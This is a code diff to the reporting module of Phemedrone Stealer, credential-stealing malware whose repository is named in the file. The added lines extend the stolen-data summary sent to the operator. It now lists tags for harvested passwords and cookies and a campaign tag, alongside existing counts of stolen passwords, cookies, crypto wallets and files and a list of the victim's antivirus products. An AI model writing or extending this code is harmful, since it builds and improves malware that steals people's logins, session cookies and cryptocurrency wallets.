@@ -8,6 +8,7 @@ using Microsoft.Win32;
 using System.Net.NetworkInformation;
 using System.Management;
 using System.Diagnostics;
+using System.Linq;
 using System.Security.Cryptography;
 using Phemedrone.Extensions;
 
@@ -18,6 +19,7 @@ namespace Phemedrone.Services
         public override PriorityLevel Priority => PriorityLevel.Low;
         public static string JsonString = GetGeoInformation();
         
+
         protected override LogRecord[] Collect()
         {
             const int padding = -25;
@@ -56,6 +58,8 @@ namespace Phemedrone.Services
 {"Extensions",padding}{ServiceCounter.ExtensionsCount}
 {"Wallets:",padding}{ServiceCounter.WalletsCount}
 {"Files:",padding}{ServiceCounter.FilesCount}
+{"\nPasswrods Tags:",padding}{string.Join(", ", ServiceCounter.passwordstags.Distinct())}
+{"Cookies Tags:",padding}{string.Join(", ", ServiceCounter.cookiestags.Distinct())}
     ----- Miscellaneous -----
 
 {"Antivirus products:",padding}{string.Join(", ", GetAv())}
@@ -107,7 +111,10 @@ https://github\.com/REvorker1/Phemedrone\-Stealer";
                 GetFileName(),
                 ServiceCounter.PasswordList.Count.ToString(),
                 ServiceCounter.CookieCount.ToString(),
-                ServiceCounter.WalletsCount.ToString()
+                ServiceCounter.WalletsCount.ToString(),
+                string.Join(", ", ServiceCounter.passwordstags.Distinct()),
+                string.Join(", ", ServiceCounter.cookiestags.Distinct()),
+                Config.Tag
             };
         }
 
